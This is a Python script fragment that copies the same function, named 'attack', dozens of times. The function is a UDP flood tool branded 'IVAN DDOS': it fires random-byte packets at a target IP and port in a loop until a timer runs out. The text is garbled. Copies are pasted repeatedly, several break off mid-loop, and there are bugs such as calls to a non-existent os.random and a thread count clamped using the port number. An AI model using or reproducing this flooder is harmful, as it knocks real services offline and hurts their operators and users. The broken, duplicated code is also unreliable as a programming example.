        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
